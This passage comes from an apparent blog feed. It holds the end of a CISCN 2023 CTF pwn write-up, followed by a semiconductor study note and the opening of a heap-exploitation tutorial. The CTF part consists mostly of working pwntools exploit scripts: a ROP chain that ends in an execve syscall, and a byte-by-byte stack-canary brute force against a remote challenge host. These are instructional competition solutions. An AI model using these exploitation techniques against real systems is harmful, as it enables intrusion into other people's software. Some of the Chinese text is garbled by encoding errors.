<span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line">pl.sendline(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pl.interactive()</span><br></pre></td></tr></table></figure><h1 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h1><p>forkÂ≠êËøõÁ®ãÂ¥©Ê∫É‰∏çÊîπÂèòcanary,Âà©Áî®ËØ•ÊÄßË¥®ÈÄêÂ≠óËäÇÁàÜÁ†¥canary,ÂèëÁé∞ÂêéÈó®ÂáΩÊï∞ÔºåÁõ¥Êé•Ë¶ÜÁõñÂâç‰∏§‰ΩçÂú∞ÂùÄÔºåÁ¨¨‰∏â‰ΩçÁõ¥Êé•Áåú</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173814568.png" alt="image-20230528173814568"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.57.248.214&quot;</span></span><br><span class="line">port = <span class="number">25775</span></span><br><span class="line"><span class="comment">#pt = process(&quot;./funcanary&quot;)</span></span><br><span class="line">pt = remote(host, port)</span><br><span class="line"></span><br><span class="line">pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i)</span><br><span class="line">        pt.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> a</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line"></span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x02&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x12&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x22&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x32&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x42&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x52&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x62&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x72&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x82&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x92&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xa2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xb2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xc2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xd2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xe2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xf2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">‰ªÄ‰πàÊó∂ÂÄôÂá∫‰∏™Á≠æÂà∞È¢òÊñπÂêëÂïä</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ÂçäÂØº‰ΩìÂü∫Á°Ä</title>
    <link href="http://deepunk.icu/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80/"/>
    <id>http://deepunk.icu/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-26T13:03:48.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Ê®°ÁîµÊàëÁúüÁöÑÂ•ΩÂñúÊ¨¢‰Ω†ÂïäÂïäÂïä:heart_eyes:</p></blockquote><h1 id="‰∫åÊûÅÁÆ°"><a href="#‰∫åÊûÅÁÆ°" class="headerlink" title="‰∫åÊûÅÁÆ°"></a>‰∫åÊûÅÁÆ°</h1><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526210931337.png" alt="image-20230526210931337"><br>$$<br>i&#x3D;I_s(e^{\frac{u}{U_T}}-1),Â∏∏Ê∏©‰∏ãU_T&#x3D;26mV<br>$$</p><h2 id="Á≠âÊïàÁîµË∑Ø"><a href="#Á≠âÊïàÁîµË∑Ø" class="headerlink" title="Á≠âÊïàÁîµË∑Ø"></a>Á≠âÊïàÁîµË∑Ø</h2><p><strong>Â§ß‰ø°Âè∑Ê®°ÂûãÔºö</strong></p><ul><li>ÁêÜÊÉ≥‰∫åÊûÅÁÆ°</li><li>ÁêÜÊÉ≥‰∫åÊûÅÁÆ°‰∏≤‰∏Ä‰∏™ÂèçÂêëÁöÑ$U_{ON}$ÁîµÂéãÊ∫ê</li></ul><p><strong>Â∞è‰ø°Âè∑Ê®°ÂûãÔºàÈùôÊÄÅÁÇπÈôÑËøëÔºâÔºö</strong></p><ul><li>Âä®ÊÄÅÁîµÈòª$r_d&#x3D;\frac{\Delta u_D}{\Delta i_D}\approx\frac{U_T}{I_D}$</li></ul><h2 id="‰∏ªË¶ÅÂèÇÊï∞"><a href="#‰∏ªË¶ÅÂèÇÊï∞" class="headerlink" title="‰∏ªË¶ÅÂèÇÊï∞"></a>‰∏ªË¶ÅÂèÇÊï∞</h2><ul><li><p>ÊúÄÂ§ßÊï¥ÊµÅÁîµÊµÅ$I_F$ÔºöÂπ≥Âùá</p></li><li><p>ÊúÄÂ§ßÂèçÂêëÂ∑•‰ΩúÁîµÂéã$U_R$ÔºöÁû¨Êó∂</p></li><li><p>ÂèçÂêëÁîµÊµÅ$I_R(I_S)$ </p></li><li><p>ÊúÄÈ´òÂ∑•‰ΩúÈ¢ëÁéá$f_M$ÔºöPNÁªìÊúâÁîµÂÆπÊïàÂ∫î</p></li></ul><h2 id="Á®≥Âéã‰∫åÊûÅÁÆ°"><a href="#Á®≥Âéã‰∫åÊûÅÁÆ°" class="headerlink" title="Á®≥Âéã‰∫åÊûÅÁÆ°"></a>Á®≥Âéã‰∫åÊûÅÁÆ°</h2><p>dddd</p><h1 id="Êô∂‰Ωì‰∏âÊûÅÁÆ°Triode"><a href="#Êô∂‰Ωì‰∏âÊûÅÁÆ°Triode" class="headerlink" title="Êô∂‰Ωì‰∏âÊûÅÁÆ°Triode"></a>Êô∂‰Ωì‰∏âÊûÅÁÆ°Triode</h1><p>:cry:</p><h2 id="ÁªìÊûÑ"><a href="#ÁªìÊûÑ" class="headerlink" title="ÁªìÊûÑ"></a>ÁªìÊûÑ</h2><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211007779.png" alt="image-20230526211007779"></p><h2 id="ÊîæÂ§ß‰ΩúÁî®"><a href="#ÊîæÂ§ß‰ΩúÁî®" class="headerlink" title="ÊîæÂ§ß‰ΩúÁî®"></a>ÊîæÂ§ß‰ΩúÁî®</h2><h3 id="ÊîæÂ§ßÊù°‰ª∂"><a href="#ÊîæÂ§ßÊù°‰ª∂" class="headerlink" title="ÊîæÂ§ßÊù°‰ª∂"></a>ÊîæÂ§ßÊù°‰ª∂</h3><ol><li>$U_{BE}&gt;U_{on}$ÔºåÂèëÂ∞ÑÁªìÊ≠£ÂÅè</li><li>$U_{CB}\geq0$ÔºåÂç≥$U_{CE}\geq U_{BE}$ÔºåÈõÜÁîµÁªìÂèçÂÅè</li></ol><h3 id="ÁîµÊµÅÂàÜÈÖç"><a href="#ÁîµÊµÅÂàÜÈÖç" class="headerlink" title="ÁîµÊµÅÂàÜÈÖç"></a>ÁîµÊµÅÂàÜÈÖç</h3><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211012892.png" alt="image-20230526211012892"><br>$$<br>I_E&#x3D;I_B+I_C<br>$$<br>ÂÖ±Â∞ÑÁîµÊµÅÊîæÂ§ßÁ≥ªÊï∞Ôºö<br>$$<br>\beta\approx\frac{I_C}{I_B}<br>$$<br>ÂÖ±Âü∫ÊûÅÁîµÊµÅÊîæÂ§ßÁ≥ªÊï∞Ôºö<br>$$<br>\alpha&#x3D;\frac{I_C}{I_E}<br>$$</p><h2 id="ËæìÂÖ•ËæìÂá∫ÁâπÊÄß"><a href="#ËæìÂÖ•ËæìÂá∫ÁâπÊÄß" class="headerlink" title="ËæìÂÖ•ËæìÂá∫ÁâπÊÄß"></a>ËæìÂÖ•ËæìÂá∫ÁâπÊÄß</h2><h3 id="ËæìÂÖ•ÁâπÊÄß"><a href="#ËæìÂÖ•ÁâπÊÄß" class="headerlink" title="ËæìÂÖ•ÁâπÊÄß"></a>ËæìÂÖ•ÁâπÊÄß</h3><p>$$<br>i_B&#x3D;f(u_{BE})\Big |<em>{U</em>{CE}}<br>$$</p><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211018315.png" alt="image-20230526211018315"></p><h2 id="ËæìÂá∫ÁâπÊÄß"><a href="#ËæìÂá∫ÁâπÊÄß" class="headerlink" title="ËæìÂá∫ÁâπÊÄß"></a>ËæìÂá∫ÁâπÊÄß</h2><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211022975.png" alt="image-20230526211022975"></p><h3 id="Êà™Ê≠¢Âå∫"><a href="#Êà™Ê≠¢Âå∫" class="headerlink" title="Êà™Ê≠¢Âå∫"></a>Êà™Ê≠¢Âå∫</h3><p>$$<br>u_{BE}&lt;U_{on},u_{BC}&lt;U_{on}<br>$$</p><h3 id="ÊîæÂ§ßÂå∫"><a href="#ÊîæÂ§ßÂå∫" class="headerlink" title="ÊîæÂ§ßÂå∫"></a>ÊîæÂ§ßÂå∫</h3><p>$$<br>u_{BE}\geq U_{on},u_{BC}&lt;U_{on}<br>$$</p><p>$$<br>i_C&#x3D;\beta i_B,\Delta i_C&#x3D;\beta\Delta i_B<br>$$</p><p>ËæìÂá∫ÂõûË∑ØÁîµÊµÅ$i_C$Âá†‰πé‰ªÖ‰ªÖÂèñÂÜ≥‰∫éËæìÂÖ•ÂõûË∑ØÁîµÊµÅ$i_B$ÔºåÂèØÁ≠âÊïà‰∏∫<strong>ÂèóÊéßÁîµÊµÅÊ∫ê</strong></p><h3 id="È•±ÂíåÂå∫"><a href="#È•±ÂíåÂå∫" class="headerlink" title="È•±ÂíåÂå∫"></a>È•±ÂíåÂå∫</h3><p>$$<br>u_{BE}\geq U_{on},u_{BC}\geq U_{on}<br>$$</p><p>Â§±ÂéªÊéßÂà∂‰ΩúÁî®ÔºåÈ•±ÂíåÂØºÈÄöÁä∂ÊÄÅ</p><h1 id="MOSFET"><a href="#MOSFET" class="headerlink" title="MOSFET"></a>MOSFET</h1><h1 id="MOSFETÊîæÂ§ßÁîµË∑Ø"><a href="#MOSFETÊîæÂ§ßÁîµË∑Ø" class="headerlink" title="MOSFETÊîæÂ§ßÁîµË∑Ø"></a>MOSFETÊîæÂ§ßÁîµË∑Ø</h1><h2 id="MOSFETÂ∞è‰ø°Âè∑ÂàÜÊûê"><a href="#MOSFETÂ∞è‰ø°Âè∑ÂàÜÊûê" class="headerlink" title="MOSFETÂ∞è‰ø°Âè∑ÂàÜÊûê"></a>MOSFETÂ∞è‰ø°Âè∑ÂàÜÊûê</h2><p>$$<br>I_D&#x3D;\frac{K(V_I-V_{TH})^2}{2}<br>$$</p><p>$$<br>i_d&#x3D;K(V_I-V_{TH})v_i<br>$$</p><h3 id="Â∞è‰ø°Âè∑Â¢ûÁõä"><a href="#Â∞è‰ø°Âè∑Â¢ûÁõä" class="headerlink" title="Â∞è‰ø°Âè∑Â¢ûÁõä"></a>Â∞è‰ø°Âè∑Â¢ûÁõä</h3><p>$$<br>\bigg|\frac{v_o}{v_i}\bigg|&#x3D;K(V_I-V_T)R_L<br>$$</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Ê®°ÁîµÊàëÁúüÁöÑÂ•ΩÂñúÊ¨¢‰Ω†ÂïäÂïäÂïä:heart_eyes:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;‰∫åÊûÅÁÆ°&quot;&gt;&lt;a href=&quot;#‰∫åÊûÅÁÆ°&quot; class=&quot;headerlink&quot; title=&quot;‰∫åÊûÅÁÆ°&quot;&gt;&lt;/a&gt;‰∫åÊûÅÁÆ°&lt;/h1&gt;&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    <category term="ESE" scheme="http://deepunk.icu/categories/ESE/"/>
    
    
    <category term="ÁîµË∑ØÂàÜÊûê" scheme="http://deepunk.icu/tags/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PWN‰ªéÂÖ•Èó®Âà∞Âá∫ÂÖ•Âπ≥ÂÆâÔºà‰∏âÔºâ‚Äî‚Äîheap</title>
    <link href="http://deepunk.icu/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap/"/>
    <id>http://deepunk.icu/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap/</id>
    <published>2023-05-22T15:22:05.000Z</published>
    <updated>2023-12-09T07:11:23.568Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ÂÜôÁöÑ‰∏çÂ•ΩÔºåÊúâÁ©∫ÂÜçÊîπ</p></blockquote><h1 id="Ê¶ÇËø∞"><a href="#Ê¶ÇËø∞" class="headerlink" title="Ê¶ÇËø∞"></a>Ê¶ÇËø∞</h1><h2 id="ÂàÜÁ±ª"><a href="#ÂàÜÁ±ª" class="headerlink" title="ÂàÜÁ±ª"></a>ÂàÜÁ±ª</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dlmalloc  ‚Äì General purpose allocator</span><br><span class="line">ptmalloc2 ‚Äì glibc</span><br><span class="line">jemalloc  ‚Äì FreeBSD and Firefox</span><br><span class="line">tcmalloc  ‚Äì Google</span><br><span class="line">libumem   ‚Äì Solaris</span><br></pre></td></tr></table></figure><h2 id="ÂàÜÈÖçÂ†ÜÁ©∫Èó¥"><a href="#ÂàÜÈÖçÂ†ÜÁ©∫Èó¥" class="headerlink" title="ÂàÜÈÖçÂ†ÜÁ©∫Èó¥"></a>ÂàÜÈÖçÂ†ÜÁ©∫Èó¥</h2><h3 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk&amp;sbrk"></a>brk&amp;sbrk</h3><p>main arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span 